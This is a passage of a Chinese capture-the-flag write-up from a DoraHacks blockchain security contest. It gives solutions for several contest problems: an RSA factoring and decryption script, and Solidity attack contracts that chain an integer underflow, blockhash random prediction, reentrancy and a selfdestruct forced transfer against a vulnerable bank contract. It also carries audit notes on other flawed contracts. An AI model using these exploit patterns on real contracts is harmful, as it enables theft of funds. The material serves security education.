class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\">from gmpy2 import is_prime as prime</span><br><span class=\"line\">from gmpy2 import iroot</span><br><span class=\"line\">n = 23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154545949713245271655372366964733467694911683404472839031932865195076679363440004259157441442904092160547940620462275523928770007343760308099893870201392965037704560065286860197211399375405419620507897112217284427055511050820476779226202266877872708788417574738346625361066145535064835057037859284000257460115692751L</span><br><span class=\"line\">nn = 23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154673727252437046185126099084752843732400209032782207790902956024459189700856089587545302854326571561755007254420608514135036673700243280752364319986331493694769729841789115612749641973878393284804681876299531933348630664123809944975501332215753682284226293973903784246618067269627749460102002825975011735463170307L</span><br><span class=\"line\"># print nn &gt; n</span><br><span class=\"line\">t = nn - n</span><br><span class=\"line\"></span><br><span class=\"line\">def f1(x, y): return pow(x * y - t, 2) - 4 * n * x * y</span><br><span class=\"line\"></span><br><span class=\"line\">def f2(x, y, s): return (t - x * y - s) / (2 * x)</span><br><span class=\"line\"></span><br><span class=\"line\">for x in xrange(366, 3000):</span><br><span class=\"line\">    for y in xrange(1, 3000):</span><br><span class=\"line\">        print x, y</span><br><span class=\"line\">        if f1(x, y) &gt;= 0:</span><br><span class=\"line\">            s, b = iroot(f1(x, y), 2)</span><br><span class=\"line\">            if b:</span><br><span class=\"line\">                if prime(f2(x, y, int(s))):</span><br><span class=\"line\">                    print &quot;Success&quot;</span><br><span class=\"line\">                    print f2(x, y, int(s))</span><br><span class=\"line\">                    exit()</span><br></pre></td></tr></table></figure>\n<p>之后RSA解密即可<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def egcd(a, b):</span><br><span class=\"line\">    if a == 0:</span><br><span class=\"line\">        return (b, 0, 1)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        g, y, x = egcd(b % a, a)</span><br><span class=\"line\">        return (g, x - (b // a) * y, y)</span><br><span class=\"line\">def modinv(a, m):</span><br><span class=\"line\">    g, x, y = egcd(a, m)</span><br><span class=\"line\">    if g != 1:</span><br><span class=\"line\">        raise Exception(&apos;modular inverse does not exist&apos;)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        return x % m</span><br><span class=\"line\"></span><br><span class=\"line\">def bytes_to_num(b):</span><br><span class=\"line\">    return int(b.encode(&apos;hex&apos;), 16)</span><br><span class=\"line\"></span><br><span class=\"line\">def num_to_bytes(n):</span><br><span class=\"line\">    b = hex(n)[2:-1]</span><br><span class=\"line\">    b = &apos;0&apos; + b if len(b)%2 == 1 else b #16进制补成偶数位</span><br><span class=\"line\">    return b.decode(&apos;hex&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">def gcd(a, b):</span><br><span class=\"line\">    if a &lt; b:</span><br><span class=\"line\">        a, b = b, a</span><br><span class=\"line\">    while b != 0:</span><br><span class=\"line\">        temp = a % b</span><br><span class=\"line\">        a = b</span><br><span class=\"line\">        b = temp</span><br><span class=\"line\">    return a</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">n= 23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154545949713245271655372366964733467694911683404472839031932865195076679363440004259157441442904092160547940620462275523928770007343760308099893870201392965037704560065286860197211399375405419620507897112217284427055511050820476779226202266877872708788417574738346625361066145535064835057037859284000257460115692751L</span><br><span class=\"line\">q = 153346707022470063255234682736500792074659843501367018551890586572000593877733769700626279692600930780783180304304442159621776245608196861201940418144595471936294352073422843950321344403965643436262621305985924339820909114418402737553700882775797335050564405239123363288904724634792579573240467129306394648627</span><br><span class=\"line\">p = 155294691991478076246533723107402680119846505071987471714029291163531622103148666018845728574257526241116901720654471382085147320775795052977889980257647661071362112907870430296641453839932096411043572129394525643559799347739002453989935199062302896371462733787830466546655020686256703190391276771066251117813</span><br><span class=\"line\">c = 18605789682603602447496491798717321758798293700581905324029316650457391496265655270825055100678097929357061608642146193773598093988238186832894784951616085628646685595376101261377731258729834390380505295109894703902052847643842156614062711247564519297808798554671766259798926540994634858657655351713982599673967765484141456377356967352743349134262973092564982272405212241089526282547070247316071159193009664342169931360323767519419547890738439815871541842638219161372841320792826512207337857015266817573319095062799628537492791048391092577478382005012019416835632572465215950053539506334972912038960318318733757235757L </span><br><span class=\"line\">e = 65537</span><br><span class=\"line\">print p*q == n</span><br><span class=\"line\">d = modinv(e,(p-1)*(q-1))</span><br><span class=\"line\">print &quot;d: &quot; + str(d)</span><br><span class=\"line\">m = pow(c,d,p*q)</span><br><span class=\"line\">print &quot;m: &quot; + str(m)</span><br><span class=\"line\">flag = hex(m)</span><br><span class=\"line\">print str(flag)[2:-1].decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Q14-puzzle-Hello\"><a href=\"#Q14-puzzle-Hello\" class=\"headerlink\" title=\"Q14 - puzzle Hello\"></a>Q14 - puzzle Hello</h3><p>长亭的晓航师傅技术厉害，出的题好，人还帅，我们队已经全员被圈粉了orz。</p>\n<p>这是一道考察与合约交互的基础题。只给了函数声明和合约地址，通过反复交互，获得提示，最后拿到flag，不是很难。我没怎么记住具体过程，不过只要是做合约审计方向的，应该都可以做出来。</p>\n<p>我这留了个邮件的记录，大佬们可以参考一下交互方式，其实两个合约可以合并，当时打得有点意识模糊。。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">随机数生成</span><br><span class=\"line\">pragma solidity ^0.4.19;</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    address public victim;</span><br><span class=\"line\">    uint256 public num;</span><br><span class=\"line\"></span><br><span class=\"line\">    function Attack() payable &#123; owner = msg.sender;</span><br><span class=\"line\">        victim = 0xc95872680072f57485aa0913ded224ee70a9e2cb;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   </span><br><span class=\"line\">    function sissel() public view returns(uint256)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        uint256 seed = uint256(blockhash(block.number-1));</span><br><span class=\"line\">        uint256 rand = seed / 26959946667150639794667015087019630673637144422540572481103610249216;</span><br><span class=\"line\">        return rand;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">交互，可能少了几个步骤，大体是这样</span><br><span class=\"line\">contract xixi &#123;</span><br><span class=\"line\">   </span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">   </span><br><span class=\"line\">    constructor()public&#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   </span><br><span class=\"line\">    function getInfo() public pure returns(string);   </span><br><span class=\"line\">    function sendFlag1() public returns(string);</span><br><span class=\"line\">    function getCode() public pure returns(string);</span><br><span class=\"line\">    function game(uint256 guess) public view returns(string);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"Q15-Puzzle-Magic-Bank\"><a href=\"#Q15-Puzzle-Magic-Bank\" class=\"headerlink\" title=\"Q15 - Puzzle Magic Bank\"></a>Q15 - Puzzle Magic Bank</h3><p>还是晓航师傅出的题，超有趣，我很喜欢这样不是很难，但是考点很多，而且每一步都理所应当的题目。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract MagicBank &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public balanceOf;</span><br><span class=\"line\">    mapping(address =&gt; uint) public creditOf;</span><br><span class=\"line\">    address owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor()public&#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function transferBalance(address to, uint amount) public&#123;</span><br><span class=\"line\">        require(balanceOf[msg.sender] - amount &gt;= 0);</span><br><span class=\"line\">        balanceOf[msg.sender] -= amount;</span><br><span class=\"line\">        balanceOf[to] += amount;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    event SendFlag(uint256 flagnum, string b64email);</span><br><span class=\"line\">    function sendFlag3(string b64email) public &#123;</span><br><span class=\"line\">        require(balanceOf[msg.sender] &gt;= 10000);</span><br><span class=\"line\">        emit SendFlag(1, b64email);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function guessRandom(uint256 guess) internal view returns(bool)&#123;</span><br><span class=\"line\">        uint256 seed = uint256(blockhash(block.number-1));</span><br><span class=\"line\">        uint256 rand = seed / 26959946667150639794667015087019630673637144422540572481103610249216;</span><br><span class=\"line\">        return rand == guess;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function buyCredit(uint256 guess) public &#123;</span><br><span class=\"line\">        require(guessRandom(guess));</span><br><span class=\"line\">        require(balanceOf[msg.sender] &gt;= 10000);</span><br><span class=\"line\">        require(creditOf[msg.sender] == 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        creditOf[msg.sender] = 1;</span><br><span class=\"line\">        balanceOf[msg.sender] -= 10000;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdrawCredit(uint amount) public&#123;</span><br><span class=\"line\">        require(creditOf[msg.sender] &gt;= amount);</span><br><span class=\"line\">        msg.sender.call.value(amount*1000000000)();</span><br><span class=\"line\">        creditOf[msg.sender] -= amount;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function sendFlag4(string b64email) public &#123;</span><br><span class=\"line\">        require(creditOf[msg.sender] &gt;= 10000);</span><br><span class=\"line\">        emit SendFlag(2, b64email);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function getEthBalance() public view returns(uint256)&#123;</span><br><span class=\"line\">        return this.balance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner()&#123;</span><br><span class=\"line\">        require(msg.sender == owner);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    function kill(address t) public onlyOwner &#123;</span><br><span class=\"line\">        selfdestruct(t);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这题的流程是这样的：</p>\n<ol>\n<li>首先随意<code>transferBalance()</code>一下，造成下溢，让balance很大，获得flag3</li>\n<li>绕过随机数预测，成功调用<code>buyCredit()</code>，购买信用。</li>\n<li><code>withdrawCredit()</code>中依然存在下溢问题，但是require变严格，需要使用重入攻击，在未更新credit时，多取几次。</li>\n<li>上面的攻击遇到一个问题，就是目标合约里没有钱。且目标合约的回调函数没有payable，需要创建另一个合约，selfdestruct后，强制给目标合约转账。</li>\n<li>credit下溢后，获得flag4。</li>\n</ol>\n<p>攻击合约：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract magic_attack &#123;</span><br><span class=\"line\">    address owner;</span><br><span class=\"line\">    string private email = &quot;OTA3ODg2MDc2QHFxLmNvbQ==&quot;;</span><br><span class=\"line\">    address private victim = 0x1180e23d7360fc19cf7c7cd26160763b500b158b;</span><br><span class=\"line\">    uint256 public rand = 0;</span><br><span class=\"line\">   </span><br><span class=\"line\">    constructor()public&#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">        email = &quot;OTA3ODg2MDc2QHFxLmNvbQ==&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   </span><br><span class=\"line\">    function step1() public&#123;</span><br><span class=\"line\">    \taddress my_to = 0x1180e23d7360fc19cf7c7cd26160763b500b151c;</span><br><span class=\"line\">    \tuint256 amount = 0x186a0;</span><br><span class=\"line\">    \tvictim.call(bytes4(keccak256(&quot;transferBalance(address,uint256)&quot;)),my_to,amount);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function step2() public&#123;</span><br><span class=\"line\">        uint256 seed = uint256(blockhash(block.number-1));</span><br><span class=\"line\">        rand = seed / 26959946667150639794667015087019630673637144422540572481103610249216;</span><br><span class=\"line\">    \tvictim.call(bytes4(keccak256(&quot;buyCredit(uint256)&quot;)),rand);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //在这里，另一个合约自毁。</span><br><span class=\"line\">    function step3() public&#123;</span><br><span class=\"line\">    \tvictim.call(bytes4(keccak256(&quot;withdrawCredit(uint256)&quot;)),1);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function () payable public&#123;</span><br><span class=\"line\">    \tvictim.call(bytes4(keccak256(&quot;withdrawCredit(uint256)&quot;)),1);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function test() public&#123;</span><br><span class=\"line\">        MagicBank mb = MagicBank(victim);</span><br><span class=\"line\">\t\tmb.sendFlag4(email);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract bomb &#123;</span><br><span class=\"line\">    address owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor()public&#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function () payable public&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function end() public&#123;</span><br><span class=\"line\">        selfdestruct(0x1180e23d7360fc19cf7c7cd26160763b500b158b);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>本次比赛天枢获得了第二名的好成绩，与小伙伴们在比赛中的默契配合和平日里老师的指导是息息相关的。</p>\n<p>让我总结一下区块链安全的要义，我想说：想象力就是武器。面对区块链和智能合约的题目，只有胆大心细多思考，才能想出完整的攻击链。</p>\n<p>现实中，合约、节点、共识算法、钱包、交易所等等，无论哪方面薄弱，都会让黑客有着把货币席卷一空的可能。</p>\n<p>就像是在赛事最后分享环节我所说，希望大家在工作中胆大心细，注意好系统的细枝末节，作为安全从业人员，才算真正完成了我们的工作。</p>\n","site":{"data":{}},"excerpt":"<p>早先就对DoraHacks举办的各种hackathon有所耳闻，一直想来参加感受一次，这次很高兴天枢能够受邀参加本场区块链安全比赛，与诸位师傅共同度过一个知性而优雅的周末。各大厂商在周六都分享了许多有意思的思路、或是自家引以为傲的产品和解决方案，开拓了我和小伙伴们的眼界。一下午的展示中收获了良多干货，为第二天的比赛也开拓了思路。</p>\n<p>本次见识到了平时只能在线上看到的诸位大师傅，也有幸享受到了师傅们精心准备的题目，包含了合约审计、漏洞利用、硬件方案、密码学、交易所安全等多个类型，受益良多。也吐槽一句，师傅们颜值都好高呀！</p>\n<p>这里给出Q1、4、11、14、15 我们队的解答。</p>","more":"<h2 id=\"题目wp\"><a href=\"#题目wp\" class=\"headerlink\" title=\"题目wp\"></a>题目wp</h2><h3 id=\"Q1-测试题\"><a href=\"#Q1-测试题\" class=\"headerlink\" title=\"Q1 - 测试题\"></a>Q1 - 测试题</h3><p>主办方提供了四个合约，需要我们给出漏洞点和修复方案，并按要求对某几个合约写出攻击合约。</p>\n<h4 id=\"Auction-sol\"><a href=\"#Auction-sol\" class=\"headerlink\" title=\"Auction.sol\"></a>Auction.sol</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.4.10;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Auction &#123;</span><br><span class=\"line\">    address public highestBidder;</span><br><span class=\"line\">    uint256 public highestBid;</span><br><span class=\"line\"></span><br><span class=\"line\">    function Auction(uint256 _highestBid) &#123;</span><br><span class=\"line\">        require(_highestBid &gt; 0);</span><br><span class=\"line\">        // 设置起拍价格        </span><br><span class=\"line\">        highestBid = _highestBid;</span><br><span class=\"line\">        highestBidder = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function bid() payable &#123;</span><br><span class=\"line\">        require(msg.value &gt; highestBid);</span><br><span class=\"line\">        // 退还上一位竞拍者资金</span><br><span class=\"line\">        highestBidder.transfer(highestBid);</span><br><span class=\"line\"></span><br><span class=\"line\">        highestBidder = msg.sender;</span><br><span class=\"line\">        highestBid = msg.value;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 根据区块高度或者时间等，结束拍卖</span><br><span class=\"line\">    function auction_end() &#123;</span><br><span class=\"line\">        // ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>很典型的King/拍卖合约，问题出在了出现下一个高价者时，上一个人退款时的transfer()。我们可以构造一个攻击合约，他的回调函数是payable，且函数中revert()或throw。即让我们的攻击合约，作为最高出价者，并且不能接受转账即可。</p>\n<h4 id=\"BankOwned-sol\"><a href=\"#BankOwned-sol\" class=\"headerlink\" title=\"BankOwned.sol\"></a>BankOwned.sol</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Owned &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    function Owned() &#123; owner = msg.sender; &#125;</span><br><span class=\"line\">    modifier onlyOwner&#123; if (msg.sender != owner) revert(); _; &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Bank is Owned &#123;</span><br><span class=\"line\">    address public owner = msg.sender;</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">    function transferOwner(address new_owner) public onlyOwner payable &#123;</span><br><span class=\"line\">         owner = new_owner;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function withdraw(uint amount) public onlyOwner &#123;</span><br><span class=\"line\">        require(amount &lt;= this.balance);</span><br><span class=\"line\">        msg.sender.transfer(amount);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里我认为是继承了Owned()函数，出现了问题，solidity的继承原理是代码拷贝，所有人都可以调用Bank里的Owned函数，但我之后并未调通，希望大家指正这里。</p>\n<h4 id=\"MyContacts-sol\"><a href=\"#MyContacts-sol\" class=\"headerlink\" title=\"MyContacts.sol\"></a>MyContacts.sol</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.4.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract MyContacts &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        struct PersonInfo &#123;</span><br><span class=\"line\">            address person;</span><br><span class=\"line\">            string phoneNumber;</span><br><span class=\"line\">            string note;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        address private owner;</span><br><span class=\"line\">        </span><br><span class=\"line\">        mapping(address =&gt; PersonInfo) contacts;</span><br><span class=\"line\"></span><br><span class=\"line\">        function MyContacts() &#123;</span><br><span class=\"line\">            owner = msg.sender;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        function addContact(address _person, string _phoneNumber, string _note) public &#123;</span><br><span class=\"line\">            PersonInfo info;</span><br><span class=\"line\">            info.person = _person;</span><br><span class=\"line\">            info.phoneNumber = _phoneNumber;</span><br><span class=\"line\">            info.note = _note;</span><br><span class=\"line\">            contacts[msg.sender] = info;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在函数里声明，会覆盖变量。</p>\n<p>这里举个<a href=\"https://paper.seebug.org/661/\" target=\"_blank\" rel=\"noopener\">启明的文章</a>，方便理解，师傅们在第一天的演讲中也提到了这一点。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity 0.4.24;</span><br><span class=\"line\"></span><br><span class=\"line\">contract test &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    struct aa&#123;</span><br><span class=\"line\">        uint x;</span><br><span class=\"line\">        uint y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    uint public a = 4;</span><br><span class=\"line\">    uint public b = 6;</span><br><span class=\"line\"></span><br><span class=\"line\">    function test1() returns (uint)&#123;</span><br><span class=\"line\">        aa x;</span><br><span class=\"line\">        x.x = 9;</span><br><span class=\"line\">        x.y = 7;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>函数test1中定义了一个局部结构体变量x，但是没有对其进行初始化。根据solidity的变量存储规则，这时候x是存储在storage中的，而且是从索引0开始，那么对其成员变量x,y赋值之后，刚好覆盖了全局变量a和b。</p>\n<h4 id=\"PrivateBank-sol\"><a 